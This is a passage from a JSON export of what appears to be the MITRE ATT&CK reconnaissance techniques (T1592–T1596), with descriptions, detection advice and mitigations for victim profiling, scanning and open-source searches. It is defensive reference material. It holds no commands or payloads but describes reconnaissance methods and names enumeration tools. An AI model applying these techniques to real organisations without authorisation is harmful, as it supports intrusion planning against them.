class=\"citation\">(Citation: ATT ScanBox)</a>\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1592.001","name":"Hardware","description":"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: hostnames, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a> Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply Chain or Hardware Additions).","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware information from visitors. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a>\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1592.002","name":"Software","description":"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a> Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Additionally, adversaries may analyze metadata from victim-owned files (e.g., PDFs, DOCs, images, and sound files hosted on victim-owned websites) to extract information about the software and hardware used to create or process those files. Metadata may reveal software versions, configurations, or timestamps that indicate outdated or vulnerable software. This information can be cross-referenced with known CVEs to identify potential vectors for exploitation in future operations. <a href=\"https://outpost24.com/blog/metadata-hackers-best-friend/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outpost24)</a>\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or for initial access (ex: Supply Chain Compromise or External Remote Services).","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect host software information from visitors. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a>\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1592.003","name":"Firmware","description":"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). <a href=\"https://arstechnica.com/information-technology/2020/08/intel-is-investigating-the-leak-of-20gb-of-its-source-code-and-private-data/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ArsTechnica Intel)</a> Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or Exploit Public-Facing Application).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1592.004","name":"Client Configurations","description":"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a> Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration information from visitors. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a> <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a>\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1593","name":"Search Open Websites/Domains","description":"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts. <a href=\"https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyware Social Media)</a> <a href=\"https://www.recordedfuture.com/threat-intelligence-101/threat-analysis-techniques/google-dorks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecurityTrails Google Hacking)</a> <a href=\"https://www.exploit-db.com/google-hacking-database\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ExploitDB GoogleHacking)</a>\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: External Remote Services or Phishing).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application developers uploading to public code repositories should be careful to avoid publishing sensitive information such as credentials and API keys."},{"id":"M1047","name":"Audit","description":"Scan public code repositories for exposed credentials or other sensitive information before making commits. Ensure that any leaked credentials are removed from the commit history, not just the current latest version of the code."}],"subTechniques":[{"id":"T1593.001","name":"Social Media","description":"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. Spearphishing Service). <a href=\"https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyware Social Media)</a> Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1593.002","name":"Search Engines","description":"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes). <a href=\"https://www.recordedfuture.com/threat-intelligence-101/threat-analysis-techniques/google-dorks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecurityTrails Google Hacking)</a> <a href=\"https://www.exploit-db.com/google-hacking-database\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ExploitDB GoogleHacking)</a>\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1593.003","name":"Code Repositories","description":"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys. <a href=\"https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Cloud Service Credentials)</a> Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information), establishing operational resources (ex: Compromise Accounts or Compromise Infrastructure), and/or initial access (ex: Valid Accounts or Phishing). \n\n<strong>Note:</strong> This is distinct from Code Repositories, which focuses on Collection from private and internally hosted code repositories.","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application developers uploading to public code repositories should be careful to avoid publishing sensitive information such as credentials and API keys."},{"id":"M1047","name":"Audit","description":"Scan public code repositories for exposed credentials or other sensitive information before making commits. Ensure that any leaked credentials are removed from the commit history, not just the current latest version of the code."}]}]},{"id":"T1594","name":"Search Victim-Owned Websites","description":"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships. <a href=\"https://www.comparitech.com/blog/vpn-privacy/350-million-customer-records-exposed-online/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Comparitech Leak)</a>\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Trusted Relationship or Phishing).\n\nIn addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as Wordlist Scanning, as well as by leveraging files such as sitemap.xml and robots.txt. <a href=\"https://medium.com/@adimenia/how-attackers-can-misuse-sitemaps-to-enumerate-users-and-discover-sensitive-information-361a5065857a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Perez Sitemap XML 2023)</a> <a href=\"https://www.theregister.com/2015/05/19/robotstxt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Register Robots TXT 2015)</a>","detection":"Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.","platforms":["PRE"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[]},{"id":"T1595","name":"Active Scanning","description":"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. <a href=\"https://www.caida.org/publications/papers/2012/analysis_slash_zero/analysis_slash_zero.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Botnet Scan)</a> <a href=\"https://wiki.owasp.org/index.php/OAT-004_Fingerprinting\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP Fingerprinting)</a> Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1595.001","name":"Scanning IP Blocks","description":"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to Gather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. <a href=\"https://www.caida.org/publications/papers/2012/analysis_slash_zero/analysis_slash_zero.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Botnet Scan)</a> Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1595.002","name":"Vulnerability Scanning","description":"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. <a href=\"https://owasp.org/www-project-automated-threats-to-web-applications/assets/oats/EN/OAT-014_Vulnerability_Scanning\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP Vuln Scanning)</a> Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1595.003","name":"Wordlist Scanning","description":"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories. <a href=\"https://www.clearskysec.com/wp-content/uploads/2021/01/Lebanese-Cedar-APT.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ClearSky Lebanese Cedar Jan 2021)</a> This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. <a href=\"https://github.com/clarketm/s3recon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: S3Recon GitHub)</a> <a href=\"https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCPBucketBrute)</a> Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.","detection":"Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Monitor for access to S3 buckets, especially those that are not intended to be publicly accessible. \n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove or disable access to any systems, resources, and infrastructure that are not explicitly required to be available externally."},{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]}]},{"id":"T1596","name":"Search Open Technical Databases","description":"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans. <a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WHOIS)</a> <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> <a href=\"https://www.circl.lu/services/passive-dns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Circl Passive DNS)</a> <a href=\"https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium SSL Cert)</a> <a href=\"https://www.sslshopper.com/ssl-checker.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSLShopper Lookup)</a> <a href=\"https://www.digitalshadows.com/blog-and-research/content-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DigitalShadows CDN)</a> <a href=\"https://shodan.io\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Shodan)</a>\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}],"subTechniques":[{"id":"T1596.001","name":"DNS/Passive DNS","description":"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). <a href=\"https://dnsdumpster.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Dumpster)</a> <a href=\"https://www.circl.lu/services/passive-dns/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Circl Passive DNS)</a> Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1596.002","name":"WHOIS","description":"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers. <a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WHOIS)</a>\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1596.003","name":"Digital Certificates","description":"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. <a href=\"https://www.sslshopper.com/ssl-checker.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSLShopper Lookup)</a> Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). <a href=\"https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium SSL Cert)</a> Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1596.004","name":"CDNs","description":"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website. <a href=\"https://www.digitalshadows.com/blog-and-research/content-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DigitalShadows CDN)</a> Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."}]},{"id":"T1596.005","name":"Scan Databases","description":"Adversaries may search within public scan databases for 